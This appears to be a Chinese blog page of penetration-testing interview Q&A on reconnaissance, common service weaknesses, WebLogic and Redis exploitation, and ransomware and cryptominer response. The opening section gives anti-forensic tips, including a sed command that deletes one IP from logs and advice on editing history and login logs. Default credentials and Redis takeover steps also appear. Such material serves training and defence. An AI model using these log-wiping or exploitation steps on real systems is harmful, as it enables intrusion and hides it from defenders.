<h2 id="入侵-Linux-后需要清除哪些日志"><a href="#入侵-Linux-后需要清除哪些日志" class="headerlink" title="入侵 Linux 后需要清除哪些日志"></a>入侵 Linux 后需要清除哪些日志</h2><p>1）web 日志如 apache 的 access.log,error.log。直接将日志清除过于明显，一般使用 sed 进行定向清除：sed -i -e ‘&#x2F;192.169.1.1&#x2F;d’<br>2）history 命令的清除，也是对 ~&#x2F;.bash_history 进行定向清除<br>3）wtmp 日志的清除，&#x2F;var&#x2F;log&#x2F;wtmp<br>4）登录日志清除 &#x2F;var&#x2F;log&#x2F;secure</p>
<h2 id="域内横向移动"><a href="#域内横向移动" class="headerlink" title="域内横向移动"></a>域内横向移动</h2><p>在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows 操作系统的整个内网环境，控制域环境下的全部机器。</p>
<h2 id="Windows、linux-反弹-shell-的方式"><a href="#Windows、linux-反弹-shell-的方式" class="headerlink" title="Windows、linux 反弹 shell 的方式"></a>Windows、linux 反弹 shell 的方式</h2><p>Windows: powershell 反弹 shell、powercat 反弹 shell<br>Linux: bash 反弹 shell、netcat 反弹 shell、wget 反弹 shell、python 反弹 shell、php 反弹 shell</p>
<h2 id="子域名搜集的方式"><a href="#子域名搜集的方式" class="headerlink" title="子域名搜集的方式"></a>子域名搜集的方式</h2><p>可以从 js 文件中寻找、搜索引擎（谷歌语法、fofa）、证书查询、使用 crossdomain.xml 文件、dns 记录、枚举、域传送漏洞。</p>
<h2 id="Oneforall-搜索的原理"><a href="#Oneforall-搜索的原理" class="headerlink" title="Oneforall 搜索的原理"></a>Oneforall 搜索的原理</h2><p>利用证书透明度、网上爬虫档案、DNS 数据集、DNS 查询、威胁情报平台数据、搜索引擎、常规检查来进行子域名搜集的。</p>
<h2 id="拿到一个待检测的站，你觉得应该先做什么"><a href="#拿到一个待检测的站，你觉得应该先做什么" class="headerlink" title="拿到一个待检测的站，你觉得应该先做什么"></a>拿到一个待检测的站，你觉得应该先做什么</h2><p>1）获取域名的 whois 信息，获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯。利用已有信息生成专用字典。<br>2）查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。<br>3）查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞。<br>4）查看 IP，进行 IP 地址端口扫描，对响应的端口进行漏洞探测，比如 rsync，心脏滴血，mysql,ftp,ssh 弱口令等。<br>5）扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如 php 探针。<br>6）google hack 进一步探测网站的信息，后台，敏感文件。</p>
<p>剩下就是上面的测试流程了</p>
<h2 id="渗透测试中常见的端口"><a href="#渗透测试中常见的端口" class="headerlink" title="渗透测试中常见的端口"></a>渗透测试中常见的端口</h2><p>1）web 类（web 漏洞&#x2F;敏感目录）第三方通用组件漏洞 struts thinkphp jboss ganglia Zabbix：80 web、80-89 web、8000-9090 web<br>2）数据库类（扫描弱口令）：1433 MSSQL、1521 Oracle、3306 MySQL、5432 PostgreSQL<br>3）特殊服务类（未授权&#x2F;命令执行类&#x2F;漏洞）：443 SSL 心脏滴血、873 Rsync 未授权、5984 CouchDB <a target="_blank" rel="noopener" href="http://xxx:5984/_utils/%E3%80%816379">http://xxx:5984/_utils/、6379</a> redis 未授权、7001,7002 WebLogic 默认弱口令，反序列、9200,9300 elasticsearch 参考 WooYun：多玩某服务器 ElasticSearch 命令执行漏洞、11211 memcache 未授权访问、27017,27018 Mongodb 未授权访问、50000 SAP 命令执行、50070,50030 hadoop 默认端口未授权访问<br>4）常用端口类（扫描弱口令&#x2F;端口爆破）：21 ftp、22 SSH、23 Telnet、2601,2604 zebra 路由，默认密码 zebra、3389 远程桌面</p>
<h2 id="12、简述-nmap-参数和不同方法扫描的优缺点"><a href="#12、简述-nmap-参数和不同方法扫描的优缺点" class="headerlink" title="12、简述 nmap 参数和不同方法扫描的优缺点"></a>12、简述 nmap 参数和不同方法扫描的优缺点</h2><p>-ST—TCP(全)连接扫描，准确但留下大量日志记录<br>-SS—TCP SYN(半)扫描，速度较快，不会留下日志<br>-sN—null 扫描，标志位全为 0，不适用 Windows<br>-sF—FIN 扫描，标志位 FIN&#x3D;1，不适用 Windows<br>-O—查看目标主机版本<br>-sV—探测服务版本<br>-A—全面扫描</p>
<h2 id="简述-Windows-及-linux-平台提权方法"><a href="#简述-Windows-及-linux-平台提权方法" class="headerlink" title="简述 Windows 及 linux 平台提权方法"></a>简述 Windows 及 linux 平台提权方法</h2><p>Windows 根据系统中没有打的补丁编号直接找 exp 提权；<br>linux 通过系统内核提权，uname -r 查看系统内核版本，查找漏洞下载 exp 提权。</p>
<h2 id="简述-linux-系统中查询日志方法"><a href="#简述-linux-系统中查询日志方法" class="headerlink" title="简述 linux 系统中查询日志方法"></a>简述 linux 系统中查询日志方法</h2><p>登录日志 last；<br>操作日志 history；<br>启动信息和错误日志&#x2F;var&#x2F;log&#x2F;message；<br>安全日志&#x2F;var&#x2F;log&#x2F;secure；<br>邮件日志&#x2F;var&#x2F;log&#x2F;maillog；<br>计划任务日志&#x2F;var&#x2F;log&#x2F;cron；</p>
<h2 id="描述一下-DeDecms-任意密码重置漏洞"><a href="#描述一下-DeDecms-任意密码重置漏洞" class="headerlink" title="描述一下 DeDecms 任意密码重置漏洞"></a>描述一下 DeDecms 任意密码重置漏洞</h2><p>DeDecms 是用户使用最多的 PHP 类 cms 系统。DeDecms 的任意密码重置漏洞通过遍历 UID 的方式获取返回的静态 gourl 跳转地址，而 CMS 未对更改密码的跳转地址进行参数隐藏导致更改密码的临时密码被泄露，泄露以后构造 URL 传入临时密码，可以不需要任何验证即可更改任意用户密码。</p>
<h2 id="常见的网站服务器容器"><a href="#常见的网站服务器容器" class="headerlink" title="常见的网站服务器容器"></a>常见的网站服务器容器</h2><p>IIS、Apache、nginx、Lighttpd、Tomcat</p>
<h2 id="如何检测-iis-短文件名漏洞"><a href="#如何检测-iis-短文件名漏洞" class="headerlink" title="如何检测 iis 短文件名漏洞"></a>如何检测 iis 短文件名漏洞</h2><p>方法一：使用 iis_shortname_Scan.py 脚本进行检测<br>用法：python IIS_shortname_Scan.py <a target="_blank" rel="noopener" href="http://www.target.com/">http://www.target.com/</a><br>方法二：使用 nmap，命令为 nmap -p 80 –script http-iis-short-name-brute 192.168.0.1&#x2F;24</p>
<p>IIS短文件名漏洞是由于HTTP请求中旧DOS 8.3名称约定（SFN）的代字符（~）波浪号引起的，它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件，并获取有关应用程序基础结构的信息。<br>检测原理基于IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。通过这种方式，攻击者可以尝试枚举出服务器中存在的短文件名，再根据短文件名猜测出最终的文件名称信息。该工具通过尝试访问不同组合的短文件名来检测IIS服务器是否容易受到短文件名漏洞的影响。</p>
<h2 id="如何判别-web-服务器是-windows-还是-linux"><a href="#如何判别-web-服务器是-windows-还是-linux" class="headerlink" title="如何判别 web 服务器是 windows 还是 linux"></a>如何判别 web 服务器是 windows 还是 linux</h2><p>方法一：nmap 带上 -O 参数<br>方法二：查看 http 报头 Server 字段<br>方法三：Windows 对于大小写不敏感，替换某个字母为大写返回正常为 Windows，反之 Linux<br>方法四：TTL 返回值，TTL 为 64，有很大可能性为 Linux，TTL 为 128，有很大可能性为 Windows，TTL 为 255，有很大可能性为 UNIX（可修改 TTL）<br>参考链接：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/20375910">https://www.zhihu.com/question/20375910</a></p>
<h2 id="Tomcat-漏洞利用"><a href="#Tomcat-漏洞利用" class="headerlink" title="Tomcat 漏洞利用"></a>Tomcat 漏洞利用</h2><p>弱口令进入后台部署 war 包 getshell、put 方法任意文件上传 (CVE-2017-12615)、tomcat ajp 协议文件包含漏洞</p>
<h2 id="Weblogic-后台默认密码"><a href="#Weblogic-后台默认密码" class="headerlink" title="Weblogic 后台默认密码"></a>Weblogic 后台默认密码</h2><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。它将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。WebLogic Server以其高扩展的架构体系闻名于业内，包括客户机连接的共享、资源pooling以及动态网页和EJB组件群集。它支持完整的Java EE规范，包括JSP、Servlet、EJB（Enterprise JavaBeans）、JMS（Java Message Service）、JNDI（Java Naming and Directory Interface）、JTA（Java Transaction API）等，适用于大规模分布式应用。<br>weblogic&#x2F;weblogic</p>
<h2 id="Weblogic-的-CVE-2019-2725-漏洞描述与修复方案"><a href="#Weblogic-的-CVE-2019-2725-漏洞描述与修复方案" class="headerlink" title="Weblogic 的 CVE-2019-2725 漏洞描述与修复方案"></a>Weblogic 的 CVE-2019-2725 漏洞描述与修复方案</h2><p>漏洞描述：由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。</p>
<p>修复建议：官方目前已发布针对此漏洞的紧急修复补丁，可以采取以下 4 种方式进行防护。<br>1）及时打上官方 CVE-2019-2725 补丁包<br>官方已于 4 月 26 日公布紧急补丁包，下载地址：<br><a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-546295.html?from=timeline">https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-546295.html?from=timeline</a></p>
<p>2）升级SDK版本</p>
<p>3）配置 URL 访问控制策略<br>部署于公网的 WebLogic 服务器，可通过 ACL 禁止对 &#x2F;_async&#x2F; 及 &#x2F;wls-wsat&#x2F; 路径的访问。</p>
<p>4）删除不安全文件<br>删除 wls9_async_response.war 与 wls-wsat.war 文件及相关文件夹，并重启 Weblogic 服务。具体文件路径如下：<br>10.3.x 版本：<br>\MiddleWare\server_10.3\server\lib%DOMAIN_HOME%\servers\AdminServer\tmp_WL_internal<br>%DOMAIN_HOME%\servers\AdminServer\tmp.internal\</p>
<p>12.1.3 版本：<br>\MiddleWare\Oracle_Home\oracle_common\modules%DOMAIN_HOME%\servers\AdminServer\tmp.internal%DOMAIN_HOME%\servers\AdminServer\tmp_WL_internal<br>注）wls9_async_response.war 及 wls-wsat.war 属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle 官方不建议对其进行此类操作。若在直接删除此包的情况下应用出现问题，将无法得到 Oracle 产品部门的技术支持。请用户自行进行影响评估，并对此文件进行备份后，再执行此操作。</p>
<h2 id="假设现-weblogic-爆发-0day-漏洞，需要你紧急排查影响，说说你的看法？"><a href="#假设现-weblogic-爆发-0day-漏洞，需要你紧急排查影响，说说你的看法？" class="headerlink" title="假设现 weblogic 爆发 0day 漏洞，需要你紧急排查影响，说说你的看法？"></a>假设现 weblogic 爆发 0day 漏洞，需要你紧急排查影响，说说你的看法？</h2><p>题目描述：假设现 weblogic 爆发 0day 漏洞，weblogic 的 &#x2F;vulpath 存在漏洞，所有存在 <a href="http://ip:port/vulpath">http://ip:port/vulpath</a> 路径的系统均受影响，现已完成目标资产的端口扫描，需要你紧急排查受影响资产，请说说你的做法<br>假设端口扫描时已有版本识别，挑出所有 weblogic 服务。存在 IP+端口地址后，通过 url 批量检测脚本 httpCatcher.py 检测出是否存在 ip:port&#x2F;vulpath 路径 200 返回值，返回即为受影响资产。<br>用法为：将 IP+端口存在一个 ip.txt 文件</p>
<p>152.136.121.47:808<br>39.108.141.35:443<br>39.108.141.35:80</p>
<p>然后修改 httpCatcher.py 的路径改为 &#x2F;vulpath</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">outfile = sys.argv[<span class="number">2</span>]</span><br><span class="line">path = <span class="string">&#x27;/&#x27;</span>  <span class="comment">##改为 &#x27;/vulpath&#x27;</span></span><br><span class="line">addrlist = []</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        addrlist = f.readlines()</span><br></pre></td></tr></table></figure>
<p>输入命令 python httpCatcher.py ip.txt 1.csv 即可得到 1.csv 文件，查看即可</p>
<h2 id="常见中间件的配置文件路径"><a href="#常见中间件的配置文件路径" class="headerlink" title="常见中间件的配置文件路径"></a>常见中间件的配置文件路径</h2><p>apache (&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;)<br>nginx (&#x2F;etc&#x2F;nginx)<br>iis7 (C:\Windows\System32\inetsrv\config)</p>
<h2 id="Struts2-反序列化漏洞"><a href="#Struts2-反序列化漏洞" class="headerlink" title="Struts2 反序列化漏洞"></a>Struts2 反序列化漏洞</h2><p>struts 是 java 的 web 框架。采取 OGNL 表达式，处理 view 层数据字符串到 controller 层转换成 java 对象，影响比较大的漏洞主要为 S2-045\046，通过 Content-Type 这个 header 头，进而执行命令，通过 Struts2 对错误消息处理进行回显。</p>
<h2 id="Zookeeper-默认的端口"><a href="#Zookeeper-默认的端口" class="headerlink" title="Zookeeper 默认的端口"></a>Zookeeper 默认的端口</h2><p>2181：对 cline 端提供服务<br>3888：选举 Leader 使用<br>2888：集群内机器通讯使用（Leader 监听此端口）</p>
<h2 id="Zookeeper-未授权访问的检查方法"><a href="#Zookeeper-未授权访问的检查方法" class="headerlink" title="Zookeeper 未授权访问的检查方法"></a>Zookeeper 未授权访问的检查方法</h2><p>telnet zookeeper 端口，输入 envi，回显路径等信息则存在 zookeeper 未授权访问漏洞</p>
<h2 id="请列出-Zookeeper-未授权访问漏洞的修复方案"><a href="#请列出-Zookeeper-未授权访问漏洞的修复方案" class="headerlink" title="请列出 Zookeeper 未授权访问漏洞的修复方案"></a>请列出 Zookeeper 未授权访问漏洞的修复方案</h2><ol>
<li>禁止将 zookeeper 暴露在公网</li>
<li>使用 iptables 对端口进行访问控制</li>
<li>添加访问控制，根据情况选择对应方式（认证用户，用户名密码）</li>
<li>绑定指定 IP 访问</li>
</ol>
<h2 id="如何检查-mongodb-未授权访问漏洞"><a href="#如何检查-mongodb-未授权访问漏洞" class="headerlink" title="如何检查 mongodb 未授权访问漏洞"></a>如何检查 mongodb 未授权访问漏洞</h2><p>方法一：使用 mongodb_unauth.py 脚本进行处理，将 ip 地址放进 target.txt，用法为：python mongodb_unauth.py target.txt<br>方法二：使用 nmap 插件，命令为：nmap -p 27017 –script mongodb-info 192.168.0.1&#x2F;24</p>
<h2 id="Redis-未授权漏洞产生原因"><a href="#Redis-未授权漏洞产生原因" class="headerlink" title="Redis 未授权漏洞产生原因"></a>Redis 未授权漏洞产生原因</h2><p>Redis 默认情况下会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
<h2 id="Redis-未授权漏洞利用条件"><a href="#Redis-未授权漏洞利用条件" class="headerlink" title="Redis 未授权漏洞利用条件"></a>Redis 未授权漏洞利用条件</h2><p>Redis 服务以 root 账户运行、无密码或弱密码进行认证、监听在 0.0.0.0 公网上</p>
<h2 id="Redis-未授权漏洞利用"><a href="#Redis-未授权漏洞利用" class="headerlink" title="Redis 未授权漏洞利用"></a>Redis 未授权漏洞利用</h2><ol>
<li>通过 Redis 的 INFO 命令，可以查看服务器相关的参数和敏感信息，为攻击者的后续渗透做铺垫</li>
<li>上传 SSH 公钥获得 SSH 登录权限</li>
<li>通过 crontab 反弹 shell</li>
<li>slave 主从模式利用</li>
</ol>
<h2 id="Hadoop-组件与相关端口"><a href="#Hadoop-组件与相关端口" class="headerlink" title="Hadoop 组件与相关端口"></a>Hadoop 组件与相关端口</h2><p>NameNode：类似于 Linux 中的 root 根目录，用于管理数据块映射、处理客户端的读写请求、配置副本策略和管理 HDFS 的名称空间；端口号 50070<br>DataNode：在 HDFS 中真正存储数据，负责存储 client 发来的数据块 block、执行数据块的读写操作<br>ResourceManager：YARN 集群主控节点，负责协调和管理整个集群的资源；端口号 8088<br>NodeManager：负责管理一个 YARN 集群中的每一个节点；端口号 8042<br>HBase：分布式的开源数据库，依赖 Hadoop 生态系统；端口号 16010<br>Kafka：分布式消息中间件<br>HDFS：Hadoop Distributed File System，Hadoop 分布式文件系统<br>YARN：Hadoop 资源管理器<br>Kylin：开源的分布式分析型数据仓库，主要提供 Hadoop&#x2F;Spark 之上的 SQL 查询接口及多维分析等功能<br>Hadoop 的框架最核心的设计就是：HDFS 和 MapReduce。HDFS 为海量的数据提供了存储，则 MapReduce 为海量的数据提供了计算。</p>
<h2 id="假设客户中了-GhostPetya-勒索病毒，请描述需要采取的应急解决方案"><a href="#假设客户中了-GhostPetya-勒索病毒，请描述需要采取的应急解决方案" class="headerlink" title="假设客户中了 GhostPetya 勒索病毒，请描述需要采取的应急解决方案"></a>假设客户中了 GhostPetya 勒索病毒，请描述需要采取的应急解决方案</h2><ol>
<li><p>未部署端点安全的终端应急解决方案</p>
<ol>
<li>做好重要文件的备份工作（非本地备份）。</li>
<li>开启系统防火墙。</li>
<li>利用系统防火墙高级设置阻止向 445 端口进行连接（该操作会影响使用 445 端口的服务）。</li>
<li>打开系统自动更新，并检测更新进行安装。</li>
<li>停止使用 Windows XP、Windows 2003 等微软已不再提供安全更新的操作系统。</li>
<li>如无需使用共享服务建议关闭该服务。</li>
</ol>
</li>
<li><p>已部署端点安全的终端应急解决方案</p>
<ol>
<li>如果用户已经部署终端管理类产品，可通过终端管理软件进行内网打补丁。</li>
<li>通过主机防火墙关闭入栈流量。主机防火墙关闭到 445 出栈流量。</li>
<li>开启文件审计，只允许 word.exe，explorer.exe 等对文件访问。</li>
</ol>
</li>
<li><p>已经感染应急解决方案</p>
<ol>
<li>断开网络连接，阻止进一步扩散。优先检查未感染主机的漏洞状况（可直接联系网御星云公司，提供免费检测工具使用），做好漏洞加固工作后方可恢复网络连接。</li>
<li>已经感染终端，根据终端数据类型决定处置方式，如果重新安装系统则建议完全格式化</li>
</ol>
</li>
<li><p>预防措施：</p>
<ol>
<li><p>打补丁：及时给系统打补丁，修复漏洞。</p>
</li>
<li><p>装杀软：安装杀毒软件，及时更新病毒库。开启防火墙，并升级到最新版本，阻止勒索病毒与其 C&amp;C 服务器通信。</p>
</li>
<li><p>做备份：定期对重要文件以及数据库做非本地备份。电脑开启系统备份，并添加保护（这样可通过卷影备份将系统恢复到被加密之前的状态）。</p>
</li>
<li><p>备份恢复：如果事先已对关键文件做了备份，在确保已清除病毒情况下可做数据备份恢复。如果卷影备份未被勒索病毒删除，可通过卷影备份将系统恢复到未感染勒索病毒的时间点。</p>
</li>
<li><p>改密码：使用长度大于 10 位的复杂密码。</p>
</li>
<li><p>加限制：禁用 GUEST 来宾用户。尽量不要使用局域网共享，或把共享磁盘设置为只读属性，不允许局域网用户改写文件。尽量关闭不必要的端口，如：445、135、139、3389、5900 。</p>
</li>
<li><p>防钓鱼：不要点击来源不明的邮件以及附件，钓鱼邮件是勒索病毒的重要传播源。</p>
</li>
</ol>
</li>
</ol>
<h2 id="如何排查常见挖矿木马"><a href="#如何排查常见挖矿木马" class="headerlink" title="如何排查常见挖矿木马"></a>如何排查常见挖矿木马</h2><ol>
<li>系统响应缓慢</li>
<li>CPU&#x2F;显卡使用率过高</li>
<li>内存&#x2F;带宽占用高</li>
</ol>
<p>登录进可疑主机后，可以通过以下方式确认挖矿木马：</p>
<ol>
<li>查看进程（系统命 ps、ls 令有可能被替换）</li>
<li>检查日志、检查系统用户</li>
<li>发现异常文件</li>
</ol>
<h2 id="ddos-攻击如何去防范"><a href="#ddos-攻击如何去防范" class="headerlink" title="ddos 攻击如何去防范"></a>ddos 攻击如何去防范</h2><p>目前对于低网络层的 DDoS 攻击有一些有效的防护手段，如丢弃第一次 SYN 包，上流量防护设备，上 WAF 封禁地址等。<br>比较难缠的是第七层，第八层的 CC 攻击，它会找到目标网站上比较消耗资源的关键位置，重复发起攻击以消耗 CPU&#x2F;内存&#x2F;数据库 IO 等资源，目前的应付手段有：优化资源消耗高位置的代码，增加硬件设备，上云，购买专业安全公司的安全服务。<br>除此之外，隐藏服务器的真实 IP、上云 WAF、CDN、负载均衡等设备，或者暂时将域名解析到公安网警网站等 也是可以作为选择方案。</p>
<h2 id="如何清查互联网暴露面"><a href="#如何清查互联网暴露面" class="headerlink" title="如何清查互联网暴露面"></a>如何清查互联网暴露面</h2><p>对于客户不清楚自己是否还有其他互联网暴露面的时候，需要先将客户已知的资产清单收集起来，方便后续对比。<br>对于公网暴露面：在出口网关设置流量监控工具（wireshark 或者自带防火墙），检测足够长的时间以获得可能存在的暴露 IP 地址 nmap 公网扫描全端口走一波，然后对照已知资产清单即可。<br>nmap 全端口扫描命令：nmap -sV -n -Pn -p- -iL ip.txt -oA OUTPUT –no-stylesheet –min-rate 5000 –max-retries 3<br>未认领的资产进行下线关停处理。</p>
<h2 id="如何开展扫描任务"><a href="#如何开展扫描任务" class="headerlink" title="如何开展扫描任务"></a>如何开展扫描任务</h2><p>题目描述：某专业公司 A 公司安全项目，跟专业公司 A 谈妥后完成了外网扫描任务，现在进行内网扫描。由于业务量比较大安排在晚上下班后进行扫描。第一天扫描晚上 9 点由于不明原因导致 A 专业公司所有系统无法访问，被专业公司 A 的人询问情况，第二天检查原因发现，是因为所有流量是经过 VPN 到达主机，导致进出口 VPN 网关堵塞，业务无法正常访问，请问被专业公司 A 的人询问情况如何应急处理？判断原因并说明后续如何开展扫描任务？<br>首先调解客户情绪，跟客户沟通，立马停止扫描以恢复业务系统正常，并告知 A 公司进行排查原因，检查网络与主机情况。<br>其次考察网络知识，既然流量通过 VPN 会进行堵塞，想办法绕过此 VPN 或者降速，这里要求提供内网扫描机器进行扫描即可，但需要吸取上次经验扫描前进行扫描测试，如在中午休息的时候进行探测性扫描，测压。然后在晚上再进行扫描，扫描时需要 A 公司派网管人员帮忙查看系统状况是否正常。</p>
<h2 id="客户并想要我方帮忙修复漏洞，此场景怎么处理"><a href="#客户并想要我方帮忙修复漏洞，此场景怎么处理" class="headerlink" title="客户并想要我方帮忙修复漏洞，此场景怎么处理"></a>客户并想要我方帮忙修复漏洞，此场景怎么处理</h2><p>题目描述：扫描任务结束后将结果发给 A 公司，A 公司对其中的一类型漏洞表示疑惑：认为自己没有办法修复此类漏洞（比较积极的专业公司），向我方询问，并想要我方帮忙修复漏洞。此场景应该怎么处理？<br>考察责任划分问题，原则上是不允许直接操作客户公司的机器，以及对于客户机器权限需要特别谨慎对待，我们负责解释漏洞这方面的事宜，并且积极的提供整改建议，并不能直接或者间接操作客户机器。<br>其次考验客户想让我们直接修复漏洞的处理方式，这种情况会经常出现在我们的日常工作中，我们要说明职责范围：我们只负责解释漏洞描述和原理以及修复建议，他们负责整改，我们对系统业务不熟悉，我们亲自修复话出现风险和问题也是我们承担不了的。</p>
<h2 id="安全任务结束后我司发结果给客户时，遗漏了某个漏洞，如何给客户解释处理"><a href="#安全任务结束后我司发结果给客户时，遗漏了某个漏洞，如何给客户解释处理" class="headerlink" title="安全任务结束后我司发结果给客户时，遗漏了某个漏洞，如何给客户解释处理"></a>安全任务结束后我司发结果给客户时，遗漏了某个漏洞，如何给客户解释处理</h2><p>题目描述：安全任务结束后，发还结果给 A 公司，A 公司经过检查后发现某个漏洞没有出现在结果里，被遗漏了。经检查后发现确实是我方当时没有扫描出来，如何跟客户解释和处理？<br>先确认该漏洞是否存在<br>如果漏洞存在：也就是我们没扫出来，就需要检查当时资产是否有活，是不是关停又开起来，是不是因为当时网络不好，带宽不够大，网络波动大，外网环境不稳定、WAF 拦截等，先稳住客户情绪，让客户相信我们是有能力的，只是偶尔因为不可控因素出现了问题，然后提供补救方案，进行补扫等后续方案<br>如果漏洞扫不出来：换个扫描器，比较差异，如果还是扫不出来的话，就要考虑优化方案，看要不要立个专项检测来单独对此漏洞进行批量排查。如果实在是我们的问题，找不到理由圆场的话，我们就老实承认，找客户经理进行沟通，提出不足并且要有改进的方案等，考虑如何给客户一个满意的交代，确保下次不会再出现此类问题。</p>
<h2 id="服务器被挖矿的原因"><a href="#服务器被挖矿的原因" class="headerlink" title="服务器被挖矿的原因"></a>服务器被挖矿的原因</h2><p>为了追求高效率，现在的黑客一般都是通过自动化脚本去扫描互联网上所有机器，寻找漏洞然后部署挖矿进程。所以大部分的挖矿都是由于受害者的主机上存在常见的漏洞。比如：<br>1）未授权访问或弱口令：Redis 未授权访问、Docker API 未授权访问、Hadoop Yarn 未授权访问、NFS 未授权访问、Rsync 弱口令、PostgreSQL 弱口令、Tomcat 弱口令、SSH 弱口令、Telnet 弱口令、Windows 远程桌面弱口令；<br>2）远程命令执行漏洞：WebLogic XML 反序列化漏洞、Jenkins 反序列化、Jboss 远程代码执行、Spring 远程代码执行、ElasticSearch 命令执行、永恒之蓝、Struts2 系列漏洞、常见 CMS 的远程命令执行漏洞；<br>3）新爆的高危漏洞：一般每次爆发新的高危漏洞，都会紧跟一波大规模的全网扫描利用和挖矿。<br>一旦发现服务器被挖矿，应该首先查看挖矿进程所属的用户，根据挖矿进程的运行用户去排查该用户下是否还运行着其它进程，确定这些进程是否有上述经常被黑客利用的漏洞。如果有常见的漏洞，则应该重点对此进行排查。</p>
<h2 id="如何清除挖矿木马"><a href="#如何清除挖矿木马" class="headerlink" title="如何清除挖矿木马"></a>如何清除挖矿木马</h2><p>1）及时隔离主机<br>部分带有蠕虫功能的挖矿木马在取得本机的控制权后，会以本机为跳板机，对同一局域网内的其他主机进行已知漏洞的扫描和进一步利用，所以发现挖矿现象后，在不影响业务的前提下应该及时隔离受感染主机，然后进行下一步分析。</p>
<p>2）阻断与矿池通讯<br>iptables -A INPUT -s xmr.crypto-pool.fr -j DROP<br>iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</p>
<p>3）清除定时任务<br>大部分挖矿进程会在受感染主机中写入定时任务完成程序的驻留，当安全人员只清除挖矿木马时，定时任务会再次从服务器下载挖矿进程或直接执行挖矿脚本，导致挖矿进程清除失败。</p>
<p>4）清除启动项<br>有的挖矿进程为了实现长期驻留，会向系统中添加启动项来确保系统重启后挖矿进程还能重新启动。所以在清除时还应该关注启动项中的内容，如果有可疑的启动项，也应该进行排查，确认是挖矿进程后，对其进行清除。</p>
<p>5）清除公钥文件<br>在用户家目录的 .ssh 目录下放置 authorized_keys 文件，从而免密登录该机器也是一种常见的保持服务器控制权的手段。在排查过程中应该查看该文件中是否有可疑公钥信息，有的话直接删除，避免攻击者再次免密登录该主机。</p>
<p>6）kill 挖矿进程<br>对于单进程挖矿程序，直接结束挖矿进程即可。但是对于大多数的挖矿进程，如果挖矿进程有守护进程，应先杀死守护进程再杀死挖矿进程，避免清除不彻底。在实际的清除工作中，应找到本机上运行的挖矿脚本，根据脚本的执行流程确定木马的驻留方式，并按顺序进行清除，避免清除不彻底。</p>
<h2 id="1、Webshell-流量交互的流量特征有哪些"><a href="#1、Webshell-流量交互的流量特征有哪些" class="headerlink" title="1、Webshell 流量交互的流量特征有哪些"></a>1、Webshell 流量交互的流量特征有哪些</h2><ol>
<li>Webshell 是用来控制服务器的，在控制服务器的过程中，就会触发许多系统函数，例如 eval、z0（菜刀特征）、shell，需监控这些关键的函数，具体需要查看是哪个网页发起的请求进行鉴别。</li>
<li>Webshell 连接可能使用 base64 编码，正常功能也会使用 base64 容易引起误报，一般与 eval 数量对比，数量差异较小时可能被上传 webshell 进行编码通讯。</li>
<li>除了系统函数、base64 编码通讯外，还存在 int_set(“display_errors”,”0”)，为 Webshell 流量特征之一。</li>
<li>还可以监控 ifconfig whoami ipconfig 等关键命令，这是获得 Webshell 后基本上都会执行的命令。</li>
</ol>
<h2 id="批量检查-http-服务使用什么工具和简略使用步骤"><a href="#批量检查-http-服务使用什么工具和简略使用步骤" class="headerlink" title="批量检查 http 服务使用什么工具和简略使用步骤"></a>批量检查 http 服务使用什么工具和简略使用步骤</h2><p>方法一：直接使用 nmapSV.py 工具即可，用法为 python3 nmapSV.py ip.txt result.txt<br>方法二：使用 nmap 工具扫描，带上 -sV 参数进行版本识别即可，将待检测的 IP 地址&#x2F;地址段添加进 ip.txt 文件中。使用命令 nmap -sV -iL ip.txt -oA OUTPUT –no-stylesheet，扫出来的结果导出 nmap 文件，使用 nmapReport 工具得出结果。</p>
<h2 id="存活性探测的简要步骤"><a href="#存活性探测的简要步骤" class="headerlink" title="存活性探测的简要步骤"></a>存活性探测的简要步骤</h2><p>使用 nmap 工具进行存活性探测 使用 nmap，命令 nmap -sP -n -iL ip.txt -oA OUTPUT –no-stylesheet<br>在 Linux 中使用 cat OUTPUT.gnmmap |grep Up |awk ‘{print $2}’ &gt; ip.cunhuo.txt 即可得到存活 IP</p>
